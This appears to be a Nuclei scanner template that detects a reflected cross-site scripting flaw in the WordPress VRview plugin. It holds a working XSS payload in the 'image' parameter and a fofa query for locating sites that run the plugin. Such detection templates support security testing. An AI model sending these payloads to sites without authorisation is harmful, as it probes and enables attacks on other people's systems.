id: vrview-xss

info:
  name: VRview Plugin - Cross-Site Scripting
  author: ritikchaddha
  severity: high
  description: |
    The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject malicious scripts into trusted websites. This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers to perform unauthorized actions or steal sensitive user data.
  reference:
    - https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html
  metadata:
    max-request: 2
    fofa-query: body="/wp-content/plugins/vrview/"
  tags: wp,wp-plugin,wordpress,vrview,xss

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '/wp-content/plugins/vrview'
        internal: true

  - raw:
      - |
        GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '<img src=x onerror=alert(document.domain)>'

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
